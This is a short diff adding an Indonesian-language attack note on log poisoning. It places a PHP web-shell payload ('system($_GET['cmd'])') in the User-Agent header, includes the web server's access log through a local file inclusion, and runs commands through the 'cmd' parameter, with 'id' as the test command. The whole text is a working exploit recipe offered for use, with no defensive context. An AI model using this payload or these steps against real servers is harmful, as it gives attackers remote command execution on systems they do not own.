@@ -1,0 +1,6 @@
+User-Agent: <?php system($_GET['cmd']); ?>
+
+lalu akses di /var/log/<nginx/apache2>/access.log buat liat hasil lfi nya
+
+kalo mau bisa rce tinggal ke index.php?page=/var/log/nginx/access.log&cmd=id
+id buat ngetes bisa ato enggaknya
